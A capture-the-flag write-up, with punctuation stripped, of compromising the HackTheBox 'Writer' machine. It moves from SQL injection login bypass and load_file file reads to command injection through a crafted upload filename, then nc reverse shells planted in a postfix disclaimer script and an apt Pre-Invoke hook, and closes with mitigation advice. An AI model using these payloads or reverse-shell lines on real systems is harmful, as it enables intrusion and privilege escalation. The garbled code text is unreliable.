---
layout: post
title:  Writer Writeup
description: This system contained an SQL injection vulnerability which could be leveraged to not only log into an application with admin privileges, but also could be used to read local files on the target. After leaking the source code of the website, an insecure usage of handling files was exploited to get RCE. With a www-data shell on the system, an insecure password of a local user located in the SQL database was cracked. Eventually the system was fully compromised through misconfigurations relating to SMTP and APT.
date:   2021-08-22 
image:  '/images/0xd4y-logo-gray.png'
tags:   [SQLi, SMTP, RCE, APT]
---

This report can be read both on this site and as its a href  https0xd4ygithubioreportsWriter20Writeuppdforiginal report forma It is highly recommended that you read the original report form instead because it is better formattednnimages0xd4ylogograypngnnLinkedIn httpswwwlinkedincominsegeveliezerhttpswwwgooglecomurlqhttpswwwlinkedincominsegeveliezersaDsourceeditorsust1653773864786089usgAOvVaw02OXACudSej5nWLBZ4W3Vk nnEmail 0xd4yWriteupsgmailcommailto0xd4yWriteupsgmailcomnnWeb https0xd4ygithubiohttpswwwgooglecomurlqhttps0xd4ygithubioWriteupssaDsourceeditorsust1653773864786836usgAOvVaw0_jePrY_ezgNebGNMiTPl nnTable of ContentsnnExecutive Summaryh2gk743bl4yws        2h2gk743bl4ywsnnAttack Narrativehfghdla5fgquk        3hfghdla5fgquknnEnumerationh5e17enz1cocp        3h5e17enz1cocpnnPort Enumerationh58c2ch507318        3h58c2ch507318nnWeb Enumerationh6io3z78bqws5        4h6io3z78bqws5nnSQL Injectionhx293nzwjnfbk        6hx293nzwjnfbknnLeveraging SQLi to Read Local Fileshg4h70w2pg84e        9hg4h70w2pg84ennGetting RCEhipxz7iecqxp        10hipxz7iecqxpnnSource Code Analysishqinf94u9q24o        10hqinf94u9q24onnFinding RCE Vulnerabilityheswqky3qu6hx        14heswqky3qu6hxnnReverse Shellhy2evuj3gcvwr        15hy2evuj3gcvwrnnPrivilege Escalationhliuipufirkbp        16hliuipufirkbpnnKylehhx02jbakg0r0        16hhx02jbakg0r0nnJohnhjq4agn4fei2y        16hjq4agn4fei2ynnRoothetqhj0aul7pm        17hetqhj0aul7pmnnPost Exploitation Analysishui1gvqou6arf        19hui1gvqou6arfnnSQLi Mitigation PDOhnw8pksu8e5re        19hnw8pksu8e5rennImage Upload RCEh4o6awot3ot4        20h4o6awot3ot4nnConclusionhm32hn92j9nqq        22hm32hn92j9nqqnnExecutive SummarynnnAfter enumerating the website the administrative page was found which involved a simple login page The username field is vulnerable to a critical SQL injection which an attacker could leverage to login as an administrative user access sensitive local files and extract usernames and password hashesnnFollowing the authentication bypass an insecure image upload feature could be exploited to gain RCE on the target After obtaining a shell as the wwwdata user escalating privileges to the local kyle user could be done by way of cracking his hash in the dev SQL database The kyle user was part of the filter group which allowed for editing the configuration files of the SMTP service running locally on port 25 Because this service was running as the john user getting a shell via the service resulted in compromising his accountnnFinally the john user is part of the management group which has access to the apt repository configuration files A cronjob running as root which performed a frequent aptget update command could therefore be taken advantage of and obtaining root privileges was possible through adding a reverse shell file in the apt configurations Please view the Post Exploitation Analysishui1gvqou6arf and Conclusionhm32hn92j9nqq sections to see remediations for these vulnerabilitiesnnAttack NarrativennnNo information was provided prior to this engagement other than the IP address of the target 101011101nnEnumerationnnn Port EnumerationnnTo examine potential vulnerabilities the ports of the target were first scannednn highlight bash n Nmap 791 scan initiated Tue Aug 17 145204 2021 as nmap sC sV oA nmapnmap 101011101  nNmap scan report for 101011101  nHost is up 0065s latency  nNot shown 996 closed ports  nPORT    STATE SERVICE     VERSION  n22tcp  open  ssh         OpenSSH 82p1 Ubuntu 4ubuntu02 Ubuntu Linux protocol 20  n sshhostkey  n   3072 9820b9d0521f4e103a4a937e50bcb87d RSA  n   256 1004797a2974db28f9ffaf68dff13f34 ECDSA  n_  256 77c4869a9f334fda71202ce151107e8d ED25519  n80tcp  open  http        Apache httpd 2441 Ubuntu  n_httpserverheader Apache2441 Ubuntu  n_httptitle Story Bank  WriterHTB  n139tcp open  netbiosssn Samba smbd 462  n445tcp open  netbiosssn Samba smbd 462  nService Info OS Linux CPE cpeolinuxlinux_kernel  n  nHost script results  n_clockskew 32s  n_nbstat NetBIOS name WRITER NetBIOS user unknown NetBIOS MAC unknown unknown  n smb2securitymode  n   202  n_    Message signing enabled but not required  n smb2time  n   date 20210817T195251  n_  start_date NA  n  nService detection performed Please report any incorrect results at httpsnmaporgsubmit   n Nmap done at Tue Aug 17 145220 2021  1 IP address 1 host up scanned in 1570 secondsn endhighlight nnFrom the nmap scan it is apparent that the SSH HTTP and SMB services are running on the target  The SMB service is of interest however there is no anonymous access to any of the sharesnnreportsWriterimage1pngnnSeeing as all of the services are up to date it follows that the HTTP service must be searched for potential vulnerabilitiesnn Web EnumerationnnUsers visiting the targets web server are met with the following home pagennreportsWriterimage4pngnnEnumerating the directories of the webpage with gobuster1ftnt1 the following directories are foundnn highlight bash ncontact              Status 200 Size 4905  nlogout               Status 302 Size 208  http101011101  nabout                Status 200 Size 3522  nstatic               Status 301 Size 313  http101011101static  n                    Status 200 Size 11971  ndashboard            Status 302 Size 208  http101011101  nserverstatus        Status 403 Size 277  nadministrative       Status 200 Size 1443n endhighlight nnA directory of particular interest is administrative especially since it cannot be found without brute forcing directories Visiting this directory reveals a simple login form which asks for a username and passwordnnreportsWriterimage2pngnnNote the domain of the target namely writerhtb However no virtual host routing is presentnnSQL InjectionnnnWhen inputting OR 11  as the username and choosing a random value for the password the user is automatically authenticated thus confirming the presence of SQL injection As an authenticated user stories can be edited and created and pictures can be uploadednnreportsWriterimage5pngnnThe web page does not properly check if an uploaded file is an image as it was possible to upload a reverse shell by the name of phpreverseshelljpgphp This however did not lead to RCE as the web page nevertheless treated the file as an image Furthermore uploading a malicious image with PHP code did not worknnAn addition to the image upload feature is the ability to upload files given a url This could be utilized to cause the server to perform GET requests to an arbitrary website of the users choicennRequestnn highlight bash  nPOST dashboardstoriesadd HTTP11Host 101011101  nUserAgent Mozilla50 Windows NT 100 rv780 Gecko20100101 Firefox780  nAccept texthtmlapplicationxhtmlxmlapplicationxmlq09imagewebpq08  nAcceptLanguage enUSenq05  nAcceptEncoding gzip deflate  nContentType multipartformdata boundary12417370376638841362770592069  nContentLength 850  nOrigin http101011101  nDNT 1  nConnection close  nReferer http101011101dashboardstoriesadd  nCookie sessioneyJ1c2VyIjoiJ09SIDE9MS0tIC0ifQYSLw7w2OHVWSzrpZAobEiyfxo94ul3lfg  nUpgradeInsecureRequests 1  nSecGPC 1  n  n12417370376638841362770592069  nContentDisposition formdata nameauthor  n  n0xd4y  n12417370376638841362770592069  nContentDisposition formdata nametitle  n  nWriteup  n12417370376638841362770592069  nContentDisposition formdata nametagline  n  nWriteup  n12417370376638841362770592069  nContentDisposition formdata nameimage filename  nContentType applicationoctetstream  n  n  n12417370376638841362770592069  nContentDisposition formdata nameimage_url  n  nhttp10101580imagejpg  n12417370376638841362770592069  nContentDisposition formdata namecontentThanks for reading  n12417370376638841362770592069n endhighlight nnNote the image_url parameter highlighted in red  nnResponsenn highlight bash n0xd4yWriteupbusinesshacktheboxmediumlinuxwriter  n sudo nc lvnp 80  nlistening on any 80   nconnect to 10101580 from UNKNOWN 101011101 38018GET imagejpg HTTP11  nAcceptEncoding identityHost 10101580  nUserAgent Pythonurllib38  nConnection closen endhighlight nnJudging from the useragent it was found that the server is running python After failing to obtain code executions despite trying many different upload attacks it follows that the source code of the upload feature must be leaked to determine how it worksnn Leveraging SQLi to Read Local FilesnnThis is possible via the load_file SQL function Going back to the login page this function can be used in conjunction with a union select statement to leak filesnnPayloadnn highlight bash nunameunion select 1load_fileetcpasswd3456 passwordan endhighlight nnResponsenn highlight bash nWelcome rootx00rootrootbinbash  ndaemonx11daemonusrsbinusrsbinnologin  nbinx22binbinusrsbinnologin  nsysx33sysdevusrsbinnologin  nsyncx465534syncbinbinsync  ngamesx560gamesusrgamesusrsbinnologin  nmanx612manvarcachemanusrsbinnologin  nlpx77lpvarspoollpdusrsbinnologin  nmailx88mailvarmailusrsbinnologin  nnewsx99newsvarspoolnewsusrsbinnologin  nuucpx1010uucpvarspooluucpusrsbinnologin  nproxyx1313proxybinusrsbinnologin  nwwwdatax3333wwwdatavarwwwusrsbinnologin  nbackupx3434backupvarbackupsusrsbinnologin  nlistx3838Mailing List Managervarlistusrsbinnologin  nircx3939ircdvarrunircdusrsbinnologin  ngnatsx4141Gnats BugReporting System adminvarlibgnatsusrsbinnologin  nnobodyx6553465534nobodynonexistentusrsbinnologin  nsystemdnetworkx100102systemd Network Managementrunsystemdusrsbinnologin  nsystemdresolvex101103systemd Resolverrunsystemdusrsbinnologin  nsystemdtimesyncx102104systemd Time Synchronizationrunsystemdusrsbinnologin  nmessagebusx103106nonexistentusrsbinnologin  nsyslogx104110homesyslogusrsbinnologin  n_aptx10565534nonexistentusrsbinnologin  ntssx106111TPM software stackvarlibtpmbinfalse  nuuiddx107112runuuiddusrsbinnologin  ntcpdumpx108113nonexistentusrsbinnologin  nlandscapex109115varliblandscapeusrsbinnologin  npollinatex1101varcachepollinatebinfalse  nusbmuxx11146usbmux daemonvarlibusbmuxusrsbinnologin  nsshdx11265534runsshdusrsbinnologin  nsystemdcoredumpx999999systemd Core Dumperusrsbinnologin  nkylex10001000Kyle Travishomekylebinbash  nlxdx998100varsnaplxdcommonlxdbinfalse  npostfixx113118varspoolpostfixusrsbinnologin  nfilterx997997Postfix Filtersvarspoolfilterbinsh  njohnx10011001homejohnbinbash  nmysqlx114120MySQL Servernonexistentbinfalsen endhighlight nnGetting RCEnnn Source Code AnalysisnnBefore being able to read the source code of the website the full path of the file containing the source code must first be discovered Seeing as the server is running apache2 the 000defaultconf file in the etcapache2sitesavailable directory a directory which holds configuration files for Apache virtual hosts can be leaked to determine this information  nnPayloadnn highlight bash nunameunion select 1load_fileetcapache2sitesavailable000defaultconf3456 passwordan endhighlight nn  nResponsenn highlight bash nWelcome  Virtual host configuration for writerhtb domain  nltVirtualHost 80gt  n       ServerName writerhtb  n       ServerAdmin adminwriterhtb  n       WSGIScriptAlias  varwwwwriterhtbwriterwsgi       ltDirectory varwwwwriterhtbgt  n               Order allowdeny  n               Allow from all  n       ltDirectorygt  n       Alias static varwwwwriterhtbwriterstatic       ltDirectory varwwwwriterhtbwriterstaticgt  n               Order allowdeny  n               Allow from all  n       ltDirectorygt  n       ErrorLog APACHE_LOG_DIRerrorlog  n       LogLevel warn  n       CustomLog APACHE_LOG_DIRaccesslog combined  nltVirtualHostgt  n  n Virtual host configuration for devwriterhtb subdomain  n Will enable configuration after completing backend development  n Listen 8080  nltVirtualHost 1270018080gt  n        ServerName devwriterhtb  n        ServerAdmin adminwriterhtb  n        Collect static for the writer2_projectwriter_webtemplates        Alias static varwwwwriter2_projectstatic  n        ltDirectory varwwwwriter2_projectstaticgt  n                Require all granted  n        ltDirectorygt  n  n        ltDirectory varwwwwriter2_projectwriterv2gt  n                ltFiles wsgipygt  n                        Require all granted  n                ltFilesgt  n        ltDirectorygt  n  n        WSGIDaemonProcess writer2_project pythonpathvarwwwwriter2_project pythonhomevarwwwwriter2_projectwriter2env  n        WSGIProcessGroup writer2_project  n        WSGIScriptAlias  varwwwwriter2_projectwriterv2wsgipy  n        ErrorLog APACHE_LOG_DIRerrorlog  n        LogLevel warn  n        CustomLog APACHE_LOG_DIRaccesslog combined  n  nltVirtualHostgt  n vim syntaxapache ts4 sw4 sts4 sr noetn endhighlight nnIn particular note the directory in which the writerwsgi file lies in highlighted in blue After finding out that the server is running python fuzzing for files in the root of the web server revealed an __init__py file within varwwwwriterhtbwriter Leaking this file reveals the following contentsnn highlight python nif requestmethod  POST        if requestfilesimage             image  requestfilesimage            if jpg in imagefilename  n                path  ospathjoinvarwwwwriterhtbwriterstaticimg imagefilename               imagesavepath               image  imgformatimagefilename           else               error  File extensions must be in jpg               return render_templateaddhtml errorerror       if requestformgetimage_url  n           image_url  requestformgetimage_url           if jpg in image_url               try                   local_filename headers  urllibrequesturlretrieveimage_url  n                   ossystemmv  jpgformatlocal_filename local_filename                   image  jpgformatlocal_filename                   try                       im  Imageopenimage                       imverify                       imclose  n                       image  imagereplacetmp                      ossystemmv tmp varwwwwriterhtbwriterstaticimgformatimage image                       image  imgformatimage  n                   except PILUnidentifiedImageError                       ossystemrm formatimage                       error  Not a valid image file  nn        if requestformgetimage_url  n           image_url  requestformgetimage_url           if jpg in image_url               try  n                   local_filename headers  urllibrequesturlretrieveimage_url                   ossystemmv  jpgformatlocal_filename local_filename                   image  jpgformatlocal_filename                   try                       im  Imageopenimage                       imverify                       imclose  n                       image  imagereplacetmp                       ossystemmv tmp varwwwwriterhtbwriterstaticimgformatimage image                       image  imgformatimage                       cursor  connectorcursor                       cursorexecuteUPDATE stories SET image  images WHERE id  ids imageimage idid  n                       result  connectorcommit  n  n                   except PILUnidentifiedImageError                       ossystemrm formatimage                       error  Not a valid image file                       return render_templateedithtml errorerror resultsresults idid  n               except                   error  Issue uploading picture                   return render_templateedithtml errorerror resultsresults idid           else  n               error  File extensions must be in jpgn endhighlight nnNote the file was shortened to better emphasize the source code of the upload feature Critically insecure code is highlighted in red and the text highlighted in purple is the segment that the undermentioned exploit focuses onnn Finding RCE VulnerabilitynnWithin the source code are multiple examples of insecure code explored more in detail in the Post Exploitation Analysishui1gvqou6arf section One that particularly stands out is the call of ossystem on the uploaded filename Before testing exploits on the target the exploit was tested out locally to get a closer view as to how the program behaves Copying the segment of interest we can get a closer look at how the program treats file namesnnCode nn highlight python nimport urllib  nimport os  nfrom flask import request  n  nlocal_filename headers  urllibrequesturlretrievehttp10101580jpg1jpgsleep  nprintThe local_filename is local_filename  nossystemmv  jpgformatlocal_filename local_filenamen endhighlight nnObserve the argument of the urllibrequesturlretrieve function The user is in control of this argument If a user were to upload a file called 1jpgsleep then the server will behave accordinglynn  nResponsennThe local_filename is tmptmpen3ya1q1nnHowever when changing the argument to be filehome0xd4ybusinesshacktheboxmediumlinuxwriterwwwjpg1jpgsleep 10 then command execution is performed This works because the urllib function does not correctly rename the file to something safe in the instance that the argument is using the file protocol Therefore a file with a malicious name can be uploaded using the image parameter and this file can then be referenced locally via the file protocolnn Reverse ShellnnAfter uploading a file with the name 0xd4yjpgecho n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDIJjF8bmMgMTAuMTAuMTUuODAgOTAwMSAL3RtcC9mbase64 dbash it was referenced locally by putting the following in the image_url parameter filevarwwwwriterhtbwriterstaticimg0xd4yjpgecho n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDIJjF8bmMgMTAuMTAuMTUuODAgOTAwMSAL3RtcC9mbase64 dbash A reverse shell was then returned as the wwwdata usernn highlight bash n0xd4yWriteupbusinesshacktheboxmediumlinuxwriter nc lvnp 9001  nlistening on any 9001   nconnect to 10101580 from UNKNOWN 101011101 59938  nbinsh 0 cant access tty job control turned off  n whoami  nwwwdatan endhighlight nnPrivilege Escalationnnn KylennAfter enumerating multiple files in the box it was found that there is a username and password in a mysql config file called etcmysqlmycnf that points to the dev databasenndatabase  devuser  djangouser  npassword  DjangoSuperPasswordnnOne of Kyles passwords is located in the databases albeit it is hashednnpbkdf2_sha256260000wJO3ztk0fOlcbssnS1wJPDbbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A Cracking this hash reveals that Kyles password is marcoantonionn JohnnnThe kyle user is part of multiple groups one of them being the filter group which has permissions to edit the etcpostfixdisclaimer file Furthermore after enumerating the ports running locally on the target it was found that port 25 is open and running a Postfix SMTP servernnWith pspy2ftnt2 running on a separate kyle SSH instance the following message was sent on the boxnnkylewriter nc localhost 25  n220 writerhtb ESMTP Postfix Ubuntu  nMAIL FROMkylewriterhtb  n250 210 Ok  nRCPT TO johnwriterhtb  n250 215 Ok  nData  n354 End data with CRLFCRLF  nThanks for reading this writeup  n  n250 200 Ok queued as 9BB6F137nnUpon sending this message the following process occurred in the backgroundnn20210825 001254 CMD UID1001 PID23607   binsh etcpostfixdisclaimer f kylewriterhtb  johnwriterhtbnnThus the server is running as the john user note UID1001 and is executing the etcpostfixdisclaimer file Seeing as the kyle user had permission to edit this file achieving a reverse shell as the john user could be obtained via appending a reverse shell to the top of the file and sending a messagenn0xd4yWriteupbusinesshacktheboxmediumlinuxwriter nc lvnp 9001  nlistening on any 9001   nconnect to 10101580 from UNKNOWN 101011101 49840  nbinsh 0 cant access tty job control turned off  n whoami  njohnnnPersistence on this account was maintained by grabbing johns ssh keynn RootnnJohn is part of the management group which has permission to edit the apt directory etcaptaptconfd a directory which is responsible for containing the apt configurations As discovered using pspy there is a cronjob running as root which performs the following command usrbinaptget update Therefore a malicious configuration that returns a reverse shell can be added to the directory as followsnn highlight bash njohnwriter echo aptUpdatePreInvoke rm tmpfmkfifo tmpfcat tmpfbinsh i 21nc 10101580 9001 tmpf  etcaptaptconfd0xd4ypwnn endhighlight nnWhen the cronjob runs again a reverse shell is returned as the root usernn highlight bash n0xd4yWriteupbusinesshacktheboxmediumlinuxwriter nc lvnp 9001  nlistening on any 9001   nconnect to 10101580 from UNKNOWN 101011101 56068  nbinsh 0 cant access tty job control turned off  n whoami  nrootn endhighlight nnPost Exploitation Analysisnnn  nnThis section goes into further detail about the vulnerabilities of the target and how to mitigate them Note that the mitigations shown in this section are incomplete pieces of code however they are secure implementations of the desired resultnnSQLi Mitigation PDOnnnThis machine contained multiple vulnerabilities starting with the SQL injection in the administrative page The vulnerability lies in the following SQL statement that is performed on the users querynn highlight sql nSelect  From users Where username  s And password  s  username passwordn endhighlight nnThis insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing To mitigate SQL injection attacks the current recommendation is to use PDO PHP Data Objects The following code does not directly pass the user input into the SQL statement Rather using PDO tells the server what the SQL query and the userinputted data are This is successfully performed because the instruction and userinput are sent separately to the databasenn highlight php nphp  n  ntry   n  n conn  new PDOmysqlhostservernamedbnamedbname db_username db_password  set the PDO error mode to exception connsetAttributePDOATTR_ERRMODE PDOERRMODE_EXCEPTION  prepare sql and bind parameters        query  INSERT INTO users usernamepassword  VALUESusernamepassword  n        statement  connpreparequery  n        statementexecutearray   username username   password password  n          n  n catchPDOException e  echo Error   egetMessage  n  nconn  null  n  nn endhighlight nnImage Upload RCEnnnAfter successfully performing an SQL injection attack an upload feature in the webpage was exploited to gain RCE due to insecure python code System commands and evaluation functions should never be performed on user input As discussed in Finding RCE Vulnerabilityheswqky3qu6hx the system function in the os module was the reason for the critical RCE vulnerability The following code prevents this vulnerabilitynn highlight python nfrom werkzeugutils import secure_filenamennfrom PIL import Image  n  nfilename  requestfileimage  n  nimage  StringIObase64b64decodedownloadfile  nallowed_extensions  jpgjpeg  nif filenamesplit1 in allowed_extensions        ntttttry  n                filename  secure_filenamefilename  n  n                img  Imageopenimage  n                imgverify  n                path  ospathjoinvarwwwwriterhtbwriterstaticimg filename                imagesavepath  n        except Exception                printInvalid image  nelse        nttttttttprintFilename extension not allowedn endhighlight nnThe above program verifies if a file is a valid image by first checking its extension Note that this is different from the source code of the website which simply searches for the presence of the jpg string in the filename After verifying the files extension PILs verify method is called on the file before the file is uploaded to the img directorynnConclusionnnn  nnMultiple vulnerabilities were present on the target which resulted in a full compromise of the system The administrative page contained an SQL injection vulnerability which resulted in the leakage of local files and authentication bypass After authenticating to the server the insecure handling of filenames led to an RCE vulnerabilitynnAfterwards the privilege escalation to root involved logging into the system as the kyle user who had permissions to edit the mail service Due to the service running under john the lateral movement involved adding a reverse shell to the configuration of the service As the john user apt configurations could be modified to exploit an aptget update cronjob running as the root user Observe the following remediations to mitigate the vulnerabilities outlined in the reportnn   Secure the SQL login page on administrativenn   PDO should be used in place of the insecure SQL statement see SQLi Mitigation PDOhnw8pksu8e5renn   Never use system or any sort of evaluation function on userinputnn   The system command on the uploaded filename resulted in RCEnn   Never reuse passwordsnn   As the wwwdata user kyles password could be retrieved by cracking his hash from the dev database This would not have been of much use if the local kyle user had a different password on the targetn   Passwords should be securenn   Fix misconfigurations related to the kyle and john usernn   kyle was able to edit a service that was run by john To mitigate this the service should either be run by kyle or kyle should not have permissions to edit the servicen   john was able to edit apt configurations This sort of privilege should not be granted to any user By adding a reverse shell to the apt configurations any user who runs the apt command can be compromised by johnnn  nn1ftnt_ref1 httpsgithubcomOJgobusterhttpswwwgooglecomurlqhttpsgithubcomOJgobustersaDsourceeditorsust1653773864860204usgAOvVaw0G3ZxMquY9ovsHERwv9Wfu nn2ftnt_ref2 httpsgithubcomDominicBreukerpspyhttpswwwgooglecomurlqhttpsgithubcomDominicBreukerpspysaDsourceeditorsust1653773864860599usgAOvVaw1i07HkYHN5cp3nF3SIrdC1n

